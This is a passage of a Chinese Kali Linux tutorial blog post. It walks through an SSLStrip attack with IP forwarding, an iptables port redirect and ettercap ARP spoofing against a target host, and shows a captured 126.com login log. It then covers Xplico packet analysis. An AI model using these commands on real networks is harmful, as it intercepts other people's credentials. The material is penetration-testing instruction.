id="3-4-监听HTTPS数据"><a href="#3-4-监听HTTPS数据" class="headerlink" title="3.4 监听HTTPS数据"></a>3.4 监听HTTPS数据</h3><p>HTTPS（Hyper Text Transfer Protocol over Secure Socket Layer或Hypertext Transfer Protocol Secure，超文本传输安全协议），是以安全为目标的HTTP通道，即HTTP的安全版。对于一些安全通信网站，将会使用HTTPS协议来加密数据，如淘宝和银行网站等。其中，HTTPS协议是在HTTP下加入了SSL层，因此加密的详细内容就是SSL。此时，用户可以使用SSLStrip工具来解密SSL加密的数据，进而获取到HTTPS数据内容。下面将介绍使用SSLStrip工具来监听HTTPS数据的方法。</p><p>使用SSLstrip工具监听HTTPS数据。具体操作步骤如下：</p><ol><li><p>开启路由转发。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span></span><br></pre></td></tr></table></figure></li><li><p>通过iptables将所有HTTP数据导入到10000端口。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000</span></span><br></pre></td></tr></table></figure></li><li><p>使用SSLstrip监听10000端口，获取到目标主机传输的敏感信息。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sslstrip -a -l 10000</span></span><br><span class="line">sslstrip 0.9 by Moxie Marlinspike running...</span><br></pre></td></tr></table></figure><p>如果没有这个工具，使用如下命令安装</p><blockquote><p>wget <a href="https://github.com/moxie0/sslstrip/archive/v0.9.tar.gz" target="_blank" rel="noopener">https://github.com/moxie0/sslstrip/archive/v0.9.tar.gz</a><br>tar xf v0.9.tar.gz<br>cd sslstrip-0.9/ &amp;&amp; python setup.py install</p></blockquote><p>从输出的信息可以看到，SSLStrip工具正在运行。此时，在当前目录下将创建一个名为sslstrip.log的日志文件。通过实施监控该日志文件，可以看到目标主机传输的数据如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tail -f sslstrip.log</span></span><br></pre></td></tr></table></figure><p>使用SSLStrip实施攻击时，可能出现一些警告信息。但是，这些信息不影响SSLStrip捕获数据包。</p><p>此时，在目标主机上访问HTTPS加密网站。如果目标用户提交敏感信息，将会被SSLStrip捕获到。例如，这里通过登录126邮箱（ <a href="https://mail.126.com" target="_blank" rel="noopener">https://mail.126.com</a> ）来验证SSLStrip攻击是否成功。当目标用户成功访问126邮箱后，将显示如下图所示的界面。</p></li></ol><ol start="4"><li><p>实施ARP欺骗攻击。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ettercap -Tq -M arp:remote /192.168.10.77// /192.168.10.1//</span></span><br></pre></td></tr></table></figure></li><li><p>从该界面可以看到，已成功显示了126邮箱的登录界面。而且，从浏览器的地址栏中可以看到已被SSLStrip工具解密为HTTP协议（ <a href="http://mail.126.com" target="_blank" rel="noopener">http://mail.126.com</a> ）。此时，用户输入用户名和密码进行登录，该信息将会被SSLStrip工具捕获到。具体显示如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2021-01-04 13:42:04,945 POST Data (passport.126.com):&#123;<span class="string">"un"</span>:<span class="string">"testuser@126.com"</span>,<span class="string">"pw"</span>:<span class="string">"S/d17ljNe/E2FR4p/Vkh04pZmLkMXVtrIFIrX+uwkRWyPxVj3T4q+fjVIpHcRIh+8DADe9xpB2IVaBXH692u6yJXOB+7tBlJggFHrUkrFuMHzxg6YOGnnH1XydhB11bqJ33crh2CQZ4xdSLaOL/VRVbJwn+xOPi2QvVwYKIhUXI="</span>,<span class="string">"pd"</span>:<span class="string">"mail126"</span>,<span class="string">"l"</span>:0,<span class="string">"d"</span>:10,<span class="string">"t"</span>:17213741378759,<span class="string">"pkid"</span>:<span class="string">"QdQXWEQ"</span>,<span class="string">"domains"</span>:<span class="string">""</span>,<span class="string">"tk"</span>:<span class="string">"7c735ac8ab9d98b9840be0bfd281c4cb"</span>,<span class="string">"pwdKeyUp"</span>:1,<span class="string">"topURL"</span>:<span class="string">"http://mail.126.com/"</span>,<span class="string">"rtid"</span>:<span class="string">"9inbIdlXGXzfbxKuIbmNUg1u0f2kQGnL"</span>&#125;</span><br><span class="line">2021-01-04 13:42:04,569 Got server response: HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure><p>从以上输出信息可以看到，目标主机访问了mail.126.com网站。而且，可以看到用户提交的用户名为 <a href="mailto:testuser@126.com" target="_blank" rel="noopener">testuser@126.com</a> ，密码是加密的。</p></li></ol><h3 id="3-5-网络数据快速分析"><a href="#3-5-网络数据快速分析" class="headerlink" title="3.5 网络数据快速分析"></a>3.5 网络数据快速分析</h3><p>当用户使用Wireshark捕获到数据包时，可以借助Xplico工具来对其数据进行快速分析。Xplico工具可以快速找出用户请求的网页地址、图片和视频等内容。</p><h4 id="3-5-1-安装并启动Xplico服务"><a href="#3-5-1-安装并启动Xplico服务" class="headerlink" title="3.5.1 安装并启动Xplico服务"></a>3.5.1 安装并启动Xplico服务</h4><p>Kali Linux默认没有安装Xplico工具。所以，在使用该工具之前，需要安装该工具。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># apt-get install xplico</span></span><br></pre></td></tr></table></figure><p>执行以上命令后，如果没有报错，则说明安装成功。接下来，需要启动该服务后才可以使用。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># service xplico start</span></span><br></pre></td></tr></table></figure><p>执行以上命令后，没有输出任何信息。由于Xplico是一个基于Web服务的工具。所以，用户还需要启动Web服务。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># service apache2 start</span></span><br></pre></td></tr></table></figure><p>现在，用户就可以访问Xplico服务了。Xplico服务默认监听的端口为9876，用户可以查看监听的端口，以确定Xplico服务是否成功启动。具体如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># netstat -anptul | grep 9876</span></span><br><span class="line">tcp6     0    0 :::9876     :::*    LISTEN   431661/apache2</span><br></pre></td></tr></table></figure><p>从以上输出的信息可以看到，正在监听TCP的端口9876。由此可以说明，Xplico服务启动成功。</p><h4 id="3-5-2-使用Xplico工具快速分析网络数据"><a href="#3-5-2-使用Xplico工具快速分析网络数据" class="headerlink" title="3.5.2 使用Xplico工具快速分析网络数据"></a>3.5.2 使用Xplico工具快速分析网络数据</h4><ol><li><p>在浏览器中访问Xplico服务器，地址为 <a href="http://IP:9876/" target="_blank" rel="noopener">http://IP:9876/</a> 。访问成功后，将显示Xplico服务的登录界面，如下图所示。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8719.png" alt="图片19"></p></li><li><p>该界面用来登录Xplico服务。Xplico服务默认的用户名和密码都是xplico。输入用户名和密码成功登录Xplico后，将显示如下图所示的界面。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8720.png" alt="图片20"></p></li><li><p>从该界面可以看到，没有任何内容。默认情况下，Xplico服务中没有任何案例及会话。需要创建案例及会话后，才可以分析捕获文件。首先创建案例，在图中选择左侧栏中的New Case选项，将显示如下图所示的界面。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8721.png" alt="图片21"></p></li><li><p>这里提供了两个分析数据的选项，分别是Uploading PCAP capture file/s和Live acquisition。其中，Uploading PCAP capture file/s选项表示上传PCAP捕获文件，并进行分析；Live acquisition选项表示实时在线捕获，并分析数据包。这里将分析捕获的数据包，在上图中选择Uploading PCAP capture file/s单选按钮。然后，指定案例名称。本例中设置案例名称为TCP，然后单击Create按钮，将显示如下图所示的界面。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8722.png" alt="图片22"></p></li><li><p>从该界面可以看到，案例已创建成功，并且在列表中显示了新建的案例。单击新建的案例名称TCP，查看案例中的会话，如下图所示。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8723.png" alt="图片23"></p></li><li><p>从该界面可以看到没有任何会话信息，接下来创建会话。在图中选择左侧栏中的New Session命令，将显示如下图所示的界面。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8724.png" alt="图片24"></p></li><li><p>在该界面Session name文本框中输入想创建的会话名称，然后单击Create按钮即可创建会话。创建成功后，将显示如下图所示的界面。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8725.png" alt="图片25"></p></li><li><p>从该界面可以看到，新建了一个名为Web的会话。此时进入该会话中，就可以加载捕获文件并进行分析了。单击会话名称Web，将显示如下图所示的界面。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8726.png" alt="图片26"></p></li><li><p>该界面是用来显示捕获文件详细信息的。目前还没有上传任何捕获文件，所以单击“选择文件”按钮来选择要分析的捕获文件，然后单击Upload按钮，即可上传捕获文件。上传成功后，将显示如下图所示的界面。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8727.png" alt="图片27"></p></li><li><p>从该界面中的Session Data部分可以看到上传的捕获文件时间及状态。从状态（Status）行信息，可以看到解码完成（DECODING COMPLETED）。而且，此时将看到捕获文件对应的每种类型数据包的数量。该界面显示了15种类型，如HTTP、MMS、Emails、FTP-TFTP-HTTP file、Web Mail等。在该界面可以看到，HTTP类型中显示了一些包信息。在左侧栏中依次选择Web|Site命令，将显示捕获文件中请求的所有链接，用户还可以查看请求链接中的图片（Image）、视频（Video）和Flash动画等。在左侧栏中依次选择Web|Images命令，即可看到所有的图片内容，如果单击Page，将显示该图片所在的网页。</p></li></ol></div><div><div><div style="text-align:center;color:#ccc;font-size:14px">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div></div></div><div></div><footer class="post-footer"><div class="post-tags"><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"><i class="fa fa-tag"></i> 渗透测试</a> <a href="/tags/%E5%97%85%E6%8E%A2%E6%AC%BA%E9%AA%97/" rel="tag"><i class="fa fa-tag"></i> 嗅探欺骗</a></div><div class="post-nav"><div class="post-nav-next post-nav-item"><a href="/2020/12/31/kali2020-4-an-zhuang-sslstrip/" rel="next" title="Kali2020.4 安装sslstrip"><i class="fa fa-chevron-left"></i> Kali2020.4 安装sslstrip</a></div><span class="post-nav-divider"></span><div class="post-nav-prev post-nav-item"><a href="/2021/01/05/kali-mi-ma-gong-ji/" rel="prev" title="密码攻击">密码攻击 <i class="fa fa-chevron-right"></i></a></div></div></footer></div></article><div class="post-spread"><div class="jiathis_style"><span class="jiathis_txt">分享到：</span> <a class="jiathis_button_fav">收藏夹</a> <a class="jiathis_button_copy">复制网址</a> <a class="jiathis_button_email">邮件</a> <a class="jiathis_button_weixin">微信</a> <a class="jiathis_button_qzone">QQ空间</a> <a class="jiathis_button_tqq">腾讯微博</a> <a class="jiathis_button_douban">豆瓣</a> <a class="jiathis_button_share">一键分享</a> <a href="http://www.jiathis.com/share?uid=2140465" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank">更多</a> <a class="jiathis_counter_style"></a></div><script type="text/javascript">var jiathis_config={data_track_clickback:!0,summary:"",shortUrl:!1,hideMore:!1}</script><script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=" charset="utf-8"></script></div></div></div></div><div class="sidebar-toggle"><div class="sidebar-toggle-line-wrap"><span class="sidebar-toggle-line sidebar-toggle-line-first"></span> <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span> <span class="sidebar-toggle-line sidebar-toggle-line-last"></span></div></div><aside id="sidebar" class="sidebar"><div id="sidebar-dimmer"></div><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">文章目录</li><li class="sidebar-nav-overview" data-target="site-overview-wrap">站点概览</li></ul><section class="site-overview-wrap sidebar-panel"><div class="site-overview"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" src="/images/chen.png" alt="Zhongzhou Chen"><p class="site-author-name" itemprop="name">Zhongzhou Chen</p><p class="site-description motion-element" itemprop="description"></p></div><nav class="site-state motion-element"><div class="site-state-item site-state-posts"><a href="/archives/%7C%7C%20archive"><span class="site-state-item-count">286</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/index.html"><span class="site-state-item-count">84</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"><a href="/tags/index.html"><span class="site-state-item-count">164</span> <span class="site-state-item-name">标签</span></a></div></nav><div class="feed-link motion-element"><a href="/atom.xml" rel="alternate"><i class="fa fa-rss"></i> RSS</a></div></div></section><section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active"><div class="post-toc"><div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#嗅探欺骗"><span class="nav-text">嗅探欺骗</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、中间人攻击"><span class="nav-text">一、中间人攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-工作原理"><span class="nav-text">1.1 工作原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-实施中间人攻击"><span class="nav-text">1.2 实施中间人攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-1-使用arpspoof工具"><span class="nav-text">1.2.1 使用arpspoof工具</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-2-使用Ettercap工具"><span class="nav-text">1.2.2 使用Ettercap工具</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、社会工程学攻击"><span class="nav-text">二、社会工程学攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-启动社会工程学工具包——SET"><span class="nav-text">2.1 启动社会工程学工具包——SET</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-Web攻击向量"><span class="nav-text">2.2 Web攻击向量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-PowerShell攻击向量"><span class="nav-text">2.3 PowerShell攻击向量</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、捕获和监听网络数据"><span class="nav-text">三、捕获和监听网络数据</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-通用抓包工具Wireshark"><span class="nav-text">3.1 通用抓包工具Wireshark</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-捕获图片"><span class="nav-text">3.2 捕获图片</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-监听HTTP数据"><span class="nav-text">3.3 监听HTTP数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-监听HTTPS数据"><span class="nav-text">3.4 监听HTTPS数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-5-网络数据快速分析"><span class="nav-text">3.5 网络数据快速分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-5-1-安装并启动Xplico服务"><span class="nav-text">3.5.1 安装并启动Xplico服务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-5-2-使用Xplico工具快速分析网络数据"><span class="nav-text">3.5.2 使用Xplico工具快速分析网络数据</span></a></li></ol></li></ol></li></ol></li></ol></div></div></section><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span id="scrollpercent"><span>0</span>%</span></div></div></aside></div></main><footer id="footer" class="footer"><div class="footer-inner"><script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="copyright">&copy; <span itemprop="copyrightYear">2021</span> <span class="with-love"><i class="fa fa-user"></i> </span><span class="author" itemprop="copyrightHolder">Zhongzhou Chen</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-area-chart"></i> </span><span class="post-meta-item-text">Site words total count&#58;</span> <span title="Site words total count">601.1k</span></div><span class="post-meta-divider"></span></div></footer></div><script type="text/javascript">"[object Function]"!==Object.prototype.toString.call(window.Promise)&&(window.Promise=null)</script><script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script><script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script><script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script><script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script><script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script><script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script><script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script><style>.copy-btn{display:inline-block;padding:6px 12px;font-size:13px;font-weight:700;line-height:20px;color:#333;white-space:nowrap;vertical-align:middle;cursor:pointer;background-color:#eee;background-image:linear-gradient(#fcfcfc,#eee);border:1px solid #d5d5d5;border-radius:3px;user-select:none;outline:0}.highlight-wrap .copy-btn{transition:opacity .3s ease-in-out;opacity:0;padding:2px 6px;position:absolute;right:4px;top:8px}.highlight-wrap .copy-btn:focus,.highlight-wrap:hover .copy-btn{opacity:1}.highlight-wrap{position:relative}</style><script>$(".highlight").each(function(t,e){var n=$("<div>").addClass("highlight-wrap");$(e).after(n),n.append($("<button>").addClass("copy-btn").append("复制").on("click",function(t){var e=$(this).parent().find(".code").find(".line").map(function(t,e){return $(e).text()}).toArray().join("\n"),n=document.createElement("textarea");document.body.appendChild(n),n.style.position="absolute",n.style.top="0px",n.style.left="0px",n.value=e,n.select(),n.focus();var o=document.execCommand("copy");document.body.removeChild(n),o?$(this).text("复制成功"):$(this).text("复制失败"),$(this).blur()})).on("mouseleave",function(t){var e=$(this).find(".copy-btn");setTimeout(function(){e.text("复制")},300)}).append(e)})</script><script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script><script type="text/javascript">function proceedsearch(){$("body").append('<div class="search-popup-overlay local-search-pop-overlay"></div>').css("overflow","hidden"),$(".search-popup-overlay").click(onPopupClose),$(".popup").toggle();var t=$("#local-search-input");t.attr("autocapitalize","none"),t.attr("autocorrect","off"),t.focus()}var isfetched=!1,isXml=!0,search_path="search.xml";0===search_path.length?search_path="search.xml":/json$/i.test(search_path)&&(isXml=!1);var path="/"+search_path,onPopupClose=function(t){$(".popup").hide(),$("#local-search-input").val(""),$(".search-result-list").remove(),$("#no-result").remove(),$(".local-search-pop-overlay").remove(),$("body").css("overflow","")},searchFunc=function(t,e,o){"use strict";$("body").append('<div class="search-popup-overlay local-search-pop-overlay"><div id="search-loading-icon"><i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i></div></div>').css("overflow","hidden"),$("#search-loading-icon").css("margin","20% auto 0 auto").css("text-align","center"),$.ajax({url:t,dataType:isXml?"xml":"json",async:!0,success:function(t){isfetched=!0,$(".popup").detach().appendTo(".header-inner");var n=isXml?$("entry",t).map(function(){return{title:$("title",this).text(),content:$("content",this).text(),url:$("url",this).text()}}).get():t,r=document.getElementById(e),s=document.getElementById(o),a=function(){var t=r.value.trim().toLowerCase(),e=t.split(/[\s\-]+/);e.length>1&&e.push(t);var o=[];if(t.length>0&&n.forEach(function(n){function r(e,o,n,r){for(var s=r[r.length-1],a=s.position,i=s.word,l=[],h=0;a+i.length<=n&&0!=r.length;){i===t&&h++,l.push({position:a,length:i.length});var p=a+i.length;for(r.pop();0!=r.length&&(s=r[r.length-1],a=s.position,i=s.word,p>a);)r.pop()}return c+=h,{hits:l,start:o,end:n,searchTextCount:h}}function s(t,e){var o="",n=e.start;return e.hits.forEach(function(e){o+=t.substring(n,e.position);var r=e.position+e.length;o+='<b class="search-keyword">'+t.substring(e.position,r)+"</b>",n=r}),o+=t.substring(n,e.end)}var a=!1,i=0,c=0,l=n.title.trim(),h=l.toLowerCase(),p=n.content.trim().replace(/<[^>]+>/g,""),u=p.toLowerCase(),f=decodeURIComponent(n.url),d=[],g=[];if(""!=l&&(e.forEach(function(t){function e(t,e,o){var n=t.length;if(0===n)return[];var r=0,s=[],a=[];for(o||(e=e.toLowerCase(),t=t.toLowerCase());(s=e.indexOf(t,r))>-1;)a.push({position:s,word:t}),r=s+n;return a}d=d.concat(e(t,h,!1)),g=g.concat(e(t,u,!1))}),(d.length>0||g.length>0)&&(a=!0,i=d.length+g.length)),a){[d,g].forEach(function(t){t.sort(function(t,e){return e.position!==t.position?e.position-t.position:t.word.length-e.word.length})});var v=[];0!=d.length&&v.push(r(l,0,l.length,d));for(var $=[];0!=g.length;){var C=g[g.length-1],m=C.position,x=C.word,w=m-20,y=m+80;0>w&&(w=0),y<m+x.length&&(y=m+x.length),y>p.length&&(y=p.length),$.push(r(p,w,y,g))}$.sort(function(t,e){return t.searchTextCount!==e.searchTextCount?e.searchTextCount-t.searchTextCount:t.hits.length!==e.hits.length?e.hits.length-t.hits.length:t.start-e.start});var T=parseInt("1");T>=0&&($=$.slice(0,T));var b="";b+=0!=v.length?"<li><a href='"+f+"' class='search-result-title'>"+s(l,v[0])+"</a>":"<li><a href='"+f+"' class='search-result-title'>"+l+"</a>",$.forEach(function(t){b+="<a href='"+f+'\'><p class="search-result">'+s(p,t)+"...</p></a>"}),b+="</li>",o.push({item:b,searchTextCount:c,hitCount:i,id:o.length})}}),1===e.length&&""===e[0])s.innerHTML='<div id="no-result"><i class="fa fa-search fa-5x" /></div>';else if(0===o.length)s.innerHTML='<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>';else{o.sort(function(t,e){return t.searchTextCount!==e.searchTextCount?e.searchTextCount-t.searchTextCount:t.hitCount!==e.hitCount?e.hitCount-t.hitCount:e.id-t.id});var a='<ul class="search-result-list">';o.forEach(function(t){a+=t.item}),a+="</ul>",s.innerHTML=a}};r.addEventListener("input",a),$(".local-search-pop-overlay").remove(),$("body").css("overflow",""),proceedsearch()}})};$(".popup-trigger").click(function(t){t.stopPropagation(),isfetched===!1?searchFunc(path,"local-search-input","local-search-result"):proceedsearch()}),$(".popup-btn-close").click(onPopupClose),$(".popup").click(function(t){t.stopPropagation()}),$(document).on("keyup",function(t){var e=27===t.which&&$(".search-popup").is(":visible");e&&onPopupClose()})</script><script type="text/javascript" src="/js/src/love.js"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({pluginRootPath:"live2dw/",pluginJsPath:"lib/",pluginModelPath:"assets/",tagMode:!1,log:!1,model:{jsonPath:"/live2dw/assets/shizuku.model.json"},display:{position:"right"},mobile:{show:!0,scale:.5},react:{opacityDefault:.7,opacityOnHover:.2}})</script></body></html><!-- rebuild by neat -->